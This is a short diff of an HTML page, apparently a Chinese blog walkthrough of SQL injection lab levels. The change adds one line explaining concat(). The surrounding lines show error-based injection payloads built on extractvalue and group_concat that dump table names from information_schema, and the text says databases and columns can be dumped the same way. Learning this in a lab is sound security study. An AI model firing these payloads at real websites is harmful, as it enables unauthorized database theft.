@@ -534,6 +534,7 @@
 <p>这里在’anything’中查询不到 位置是 /database()的内容，</p>
 <p>但也没有语法错误，不会报错，下面故意写入语法错误：</p>
 <p>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))</p>
+<p>concat()查询结果合并但保持原有行数</p>
 <h5 id="id-1’-and-extractvalue-1-concat-0x7e-select-group-concat-table-name-from-information-schema-tables-where-20-table-schema-database-–"><a href="#id-1’-and-extractvalue-1-concat-0x7e-select-group-concat-table-name-from-information-schema-tables-where-20-table-schema-database-–" class="headerlink" title="?id=-1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where%20 table_schema = database()))) –+"></a>?id=-1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where%20 table_schema = database()))) –+</h5><p>爆库，列，字段只要修改一下即可。</p>
 <hr>
 <p>第六关</p>
